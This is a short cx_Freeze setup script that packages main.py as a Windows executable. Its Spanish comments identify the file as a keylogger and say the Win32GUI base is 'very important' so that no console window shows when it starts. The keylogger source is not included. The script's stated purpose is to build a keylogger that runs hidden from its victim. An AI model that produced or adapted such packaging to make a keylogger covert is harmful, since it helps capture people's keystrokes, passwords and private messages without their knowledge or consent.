import sys
from cx_Freeze import setup, Executable
setup(name = "setup",
      version = "0.1",
      executables = [Executable("main.py", base="Win32GUI")])
#Executable(nombre del archivo keylogger.py)
#base="Win32GUI" -- MUY IMPORTANTE -- Para que no se ejecute ninguna consola al iniciar el programa
